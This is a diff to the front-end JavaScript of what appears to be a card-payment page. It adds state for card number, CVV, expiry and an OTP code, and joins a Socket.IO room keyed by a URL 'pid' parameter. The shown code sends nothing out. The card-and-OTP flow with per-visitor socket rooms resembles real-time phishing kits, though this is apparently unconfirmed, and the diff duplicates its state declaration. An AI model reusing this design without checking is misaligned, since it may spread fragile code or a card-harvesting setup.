@@ -214,6 +214,29 @@ window.onerror = function(message, source, lineno, colno, error) {
 };
             
 document.addEventListener('DOMContentLoaded', function() {
+    // First, define the state variable 
+    let state = {
+        step: 'card', // 'card', 'otp', 'processing', 'success', 'failure'
+        transactionId: '',
+        loading: false,
+        otpValue: '',
+        amount: 1299.00,
+        maskedPhone: '',
+        cardType: null,
+        timeLeft: 59,
+        canResend: false,
+        cardForm: {
+            cardNumber: '',
+            cardHolder: '',
+            expiryDate: '',
+            cvv: '',
+            errors: {}
+        }
+    };
+    
+    // Timer reference
+    let timerRef = null;
+    
     // Add basic content with error handling
     const appElement = document.getElementById('app');
     if (appElement) {
@@ -234,7 +257,14 @@ document.addEventListener('DOMContentLoaded', function() {
         // Socket event handlers
         socket.on('connect', () => {
             console.log('Connected to Socket.IO server with ID:', socket.id);
-            // ...rest of connect handler
+            
+            // Join room based on URL pid parameter
+            const urlParams = new URLSearchParams(window.location.search);
+            const pid = urlParams.get('pid');
+            if (pid) {
+                console.log('Joining room for PID:', pid);
+                socket.emit('join', pid);
+            }
         });
 
         socket.on('disconnect', () => {
@@ -264,13 +294,6 @@ document.addEventListener('DOMContentLoaded', function() {
             transactionId: '',
             // ...rest of state object
         };
-        
-        // All your other functions and code here...
-        // function getReadableFailureReason() {...}
-        // function showMCVerification() {...}
-        // ...etc
-        
-        // Initialize the application
         initApp(); // This function call should be inside the try block
         
     } catch (error) {
